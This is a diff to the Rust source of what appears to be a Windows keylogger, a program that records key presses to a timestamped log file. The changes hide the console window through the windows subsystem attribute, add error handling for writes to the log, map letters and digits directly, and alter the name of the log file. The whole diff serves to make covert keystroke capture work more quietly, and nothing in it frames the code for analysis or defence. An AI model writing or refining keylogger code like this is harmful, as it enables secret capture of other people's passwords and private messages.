@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 #[cfg(windows)]
 extern crate winapi;
 
@@ -41,13 +43,20 @@ fn run(file: &mut File) {
                     print!("{}", s);
                 }
 
-                file.write(s.as_bytes());
+                match file.write(s.as_bytes()) {
+                    Err(e) => { println!("Couldn't write to log file: {}", e) }
+                    _ => {}
+                }
             }
         }
     }
 }
 
 fn keycode_to_string(k: u8) -> String {
+    if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
+        return format!("{}", (k as char));
+    }
+
     match k {
         0x01 => { "VK_LBUTTON".to_string() }
         0x02 => { "VK_RBUTTON".to_string() }
@@ -183,7 +192,7 @@ fn keycode_to_string(k: u8) -> String {
         0xFD => { "VK_PA1".to_string() }
         0xFE => { "VK_OEM_CLEAR".to_string() }
 
-        _ => { return format!("KEY_{}", (k as char)); }
+        _ => { return format!("CODE_{}", k); }
     }
 }
 
@@ -194,7 +203,7 @@ fn run(file: &mut File) {
 
 fn main() {
     let now: DateTime<Utc> = Utc::now();
-    let filename = format!("log-{}-{}-{}.txt", now.date(), now.hour(), now.minute());
+    let filename = format!("log-{}-{}+{}+{}.log", now.date(), now.hour(), now.minute(), now.second());
 
     let mut output = {
         match OpenOptions::new().write(true).create(true).open(&filename) {
